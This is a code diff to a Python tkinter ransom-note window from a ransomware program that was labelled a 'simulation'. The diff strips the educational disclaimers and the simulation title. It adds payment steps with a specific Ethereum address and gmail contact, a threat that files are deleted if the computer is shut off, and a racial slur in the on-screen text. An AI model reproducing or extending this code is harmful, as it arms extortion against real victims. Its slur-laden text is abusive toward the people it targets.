@@ -25,7 +25,7 @@ class DecryptorApp(tk.Tk):
     def __init__(self):
         super().__init__()
         self.iconbitmap(ICON_PATH)
-        self.title("Ransomware Simulation")
+        self.title("YOU JUST FUCKED UP YOUR COMPUTER")
         self.configure(bg='black')
         self.geometry("900x800")
         self.initialize_ui()
@@ -49,10 +49,10 @@ class DecryptorApp(tk.Tk):
         ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
 | Attention: Your Files Are Encrypted | \n\n
 To get your file back please do following instruction.
-Step 1: Send 1 ETH to this address: 0x77A89BDe5421a3765328182f642E7E59315e2056 through ERC20\n
+Step 1: Send 1 ETH to this address: 0x77A89BDe5421a3765328182f642E7E59315e2056 through ERC20 chain\n
 Step 2: After receive your ETH we will send you the decryption key.\n:
  ** To Recover Your Files:** \n
-Install any remote desktop software and mail us at [doggu683@gmail.com]\n\n
+Install any remote desktop software or mail us at [doggu683@gmail.com]\n\n
 Step 3: Wait for the decryption key to be sent to you. \n
 Step 4: Enter the decryption key in the box below and click on the 'Start Decryption' button. \n\n
 """
@@ -64,13 +64,15 @@ Step 4: Enter the decryption key in the box below and click on the 'Start Decryp
 
 
         # Creating he text with appropriate tags
-        ransom_note_label.insert(tk.END, " Proof of Concept: Ransomware Simulation \n", "center_red")
+        ransom_note_label.insert(tk.END, "You are dead nigga \n", "center_red")
         ransom_note_label.insert(tk.END, "| Attention: Your Files Are Encrypted | \n\n", "center_red")
-        ransom_note_label.insert(tk.END, "This simulation is solely for educational purposes and must not be used maliciously.\n", "center_green")
-        ransom_note_label.insert(tk.END, "Users are fully accountable for their actions.\n", "center_white")
+        ransom_note_label.insert(tk.END, "To get your file back please do following instruction..\n", "center_green")
+        ransom_note_label.insert(tk.END, "Step 1: Send 0.1 ETH to this address: 0x77A89BDe5421a3765328182f642E7E59315e2056 through ERC20 chain.\n", "center_red")
+        ransom_note_label.insert(tk.END, "Step 2: After receive your ETH we will send you the decryption key through email\n", "center_white")
+        ransom_note_label.insert(tk.END, "Step 3: Wait for the decryption key to be sent to you, if you turn off your computer your file will be deleted and cannot be recover\n", "center_white")
         ransom_note_label.insert(tk.END, "Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n", "center_white")
         ransom_note_label.insert(tk.END, " ** To Recover Your Files:** \n", "center_yellow")
-        ransom_note_label.insert(tk.END, "Ping Us at [ mykeys@cryptolock.xyz ]\n", "center_yellow")
+        ransom_note_label.insert(tk.END, "Ping Us at [ doggu683@gmail.com ]\n", "center_yellow")
 
 
         # Configuring the tags
@@ -108,7 +110,7 @@ Step 4: Enter the decryption key in the box below and click on the 'Start Decryp
 
 
         # Banner at the top of the log
-        banner_text = "Welcome to CryptoLock - [HACKER MODE]"
+        banner_text = "TERMINAL - [WE WANT MONEY - YOU WANT YOUR FILES]"
         banner_label = tk.Label(log_frame, text=banner_text, fg='orange', bg='black', font=('Courier New', 12))
         banner_label.pack(side=tk.TOP, fill=tk.X)
         self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
